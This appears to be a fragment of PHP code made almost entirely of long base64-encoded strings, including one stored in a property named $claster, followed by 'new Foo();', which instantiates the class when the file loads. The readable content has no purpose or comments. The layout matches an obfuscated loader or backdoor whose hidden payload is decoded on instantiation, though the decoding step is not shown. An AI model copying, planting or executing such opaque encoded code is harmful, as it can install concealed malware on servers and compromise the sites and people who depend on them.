	sPmx7J14zyv+AjGu0NovECXeprJn7BZvmhoHHgOuOCcqXiLOyuWnrVovvpKid7xklxJClPxTfYIfgLPNAbb3767XdrV0KUZdlpc8
	zTLrBp7hBAL1H+byOM2t1JidstNDOt/xYM9a5eEsAVacwklWG3Ohfy2fiA+lZ8CdB6M58V1kFDlB/ZOtiMrAVHtYDo4+otS/f7bb
	TK0be9YpmxAsfTENS1mpd83gTExHbbVsK8+dNWDkftTVzUI3X99llbLaeO5ll7fEqYRGiNJPUWCT7b6LRkB5iDzc/tEnCJjyINSD
	7reNgCUROpcfsjBXN7jfSPHIeM4PNtUaWQ4Cj7SyYa//baRNwHxjVPZcd60lH65W1dLWgNrEnIfMnvDhf/CCUfs+SAKrSHHou89Q
	T0kBluEK3TkrEEC+a2KClkLl9LfNCe7unXvbZu5qQZan15zc5MSeHKOi3HF5RbviA8d6Xuk+S7WeN09V2+nVzFmtfCjTNMh9gDjY
	WQB/BHlzwLkLjJXQdPT5xZRbhiSw0cGwwstxzCLj93+dYdVuHNPdRcgYW9rgXJRMd8vRxxgJzp2rb1WjKQUESYOkyIHlty7Lizzq
	2R+8UOTQA056/hcwkf33UaS/6TnnRnYXQ2mwfg32t71WCjZ6EFKiCQZJOYFRn2DYa3QL/0AfNDleOQTAgzUl3z2ZpdC9Dt/d1Lc7
	Z5coyciYZonn53yKnDhuYB+Yq9cHyyG4Tg7w//2aiGXOPjOuLzyViE1P90sdcfL+B74VjUJXDSyRibmAYucTo5C705p6PJWsgNld
	WCrMho/iS5u3yHwh4z2TxbtmawkCSr1CkvGMEXwaI9WMvaBDllFd59WxlDXUxPe6rSVhyWUdt5u1zBJx7loL4Y0AzwJkFn9JtrK6
	Asz4QTPoCTLy20OtG0YJNmLM2tkVXon9IV4lxNRdROlRlKxoWZMMWnJHJNiaNDbAKewaLgel4k3VKJi5KwcTUfdVsHi+epm7ueHq
	RBE2niBky5aLgi0hPTCcTbdxlKcWJLDNWEj7Pxsa6rXjQ32uNCcoBfgtydPKrR36AehjD4ifOU9yJ0A/Odgutd7Yx7BRNvjOEewF
	cMPmKrDycWhk8kKVkIZme4akaOoYJstu5YAN2Lc65ynlPoiLtAu74B+kQkWoaA0ZGC4m7UdAy3BoM0q66t1SgLm62r66lqsyzUJw
	ldPZ7ng7jaKpLqb2ejMaPkhrg/ODcaBRV1aApU0TRl5+Auehv1geNPcoONel+/HWt6vn9pzQBNHFc/J2w1+e424dOrC4klyKuu+q
	EggeYwqosKFw4/OHtiHfmHUcEyD60F+B4y1ayJ1IMG4+olY7Frv9yFAUJIqN/xXRkcMIbSY4H2aM/kl8ORnrEzIciMxJuUvpoiHH
	DIjtxaLI07F4lHCAjYxSisL6KgI0Ej2JtGFUyhCdo/BOEXxWD4WbgQ3H20UunnLYDR3LVAuFoKtFFAhGtaHB6zwoBIjOx3xOtdCy
	VX6sjNgZuLeO1dkE35zyNwnIDuvGh/Jq3l7eCLicPxRH336wQm0H9SY3ireaXMUWAjuhg+SF2BdFgU3JmMOKwz2QDx5sflJ+wM73
	QT/9kFua0MVxCwOu21OpfMThHrWQ7tt40f7qexqq8tA7khKiO0LqtoFuFLsY12TbZhkeA29N7kzJw0dWfr7CaXh9lFTA1TAeCqg9
	VatIJOMW/mRERh2pg0jJbAx2wsY=";

    var $claster = "XY9BS8NAEIXvhf6HcQlsAkEtxVJJk4ssVDxEk+glSFjbrVnoZsPupNh/78R60Nxm5r355k3gT7KDFFjD
	4Br88OHRhWZ/FwZNKYo3UdR8W1XPzTYvK/4exXAbwzJK5jN9CLX3CslYiJdXUVY1b8wneSIIWt8S8x9t
	YvoBLVZRAuro1R/YQ54/PYo6GHMRaz77hU2UBGjnSpkez+HooKtO4eA6kM7JyywGvl4tlvdrPgZWu9YC
	3xysMyB3qG2XMgZGYWv3KeutR5ZtdNcPCHjuVcpQfSGDThqqKfREpeeMJv0kjwO1WUb6zQjPePIN";
}

new Foo();
